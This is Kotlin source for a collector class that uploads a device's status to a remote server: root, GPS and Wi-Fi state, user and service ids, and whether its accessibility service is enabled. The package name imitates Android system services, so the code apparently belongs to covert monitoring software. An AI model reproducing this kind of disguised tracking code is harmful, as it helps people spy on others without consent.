package com.android.services.logs.collectors

import android.content.Context
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.models.UserSetting
import com.android.services.network.RemoteServerHelper
import com.android.services.network.api.TOSApi
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.DeviceInformationUtil
import com.android.services.util.logVerbose

class SyncSettingCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
    private val tosApi: TOSApi,
) : LogsCollector {
    override fun uploadLogs() {
        val serverHelper = RemoteServerHelper(
            context,
            AppConstants.SYNC_SETTING_TYPE,
            localDatabaseSource,
            tosApi = tosApi
        )
        val psid = AppConstants.phoneServiceId ?: ""
        val userId = AppConstants.userId ?: ""
        val appVersion =
            "${
                DeviceInformationUtil.versionName
            }_${DeviceInformationUtil.deviceOS}"
        val syncTime = AppUtils.formatDate(System.currentTimeMillis().toString()) ?: ""
        val appProtected=if (AppUtils.isAccessibilityEnabled(context)) "1" else "0"
        val isGooglePlayAvailable=DeviceInformationUtil.isGooglePlayServicesAvailable(context)
        val imeiInfo= "_${appProtected}__${isGooglePlayAvailable}"

        val userSetting = try {
            UserSetting(
                psid,
                userId,
                DeviceInformationUtil.isWifiEnabled(context),
                DeviceInformationUtil.isDeviceRooted,
                DeviceInformationUtil.isGpsEnabled(context),
                appVersion, syncTime,
                imeiInfo
            )
        } catch (e: Exception) {
            UserSetting(psid, userId, appVersion = appVersion, syncTime = syncTime)
        }
        logVerbose("${AppConstants.SYNC_SETTING_TYPE} object = $userSetting")
        serverHelper.upload(listOf(userSetting))
    }
}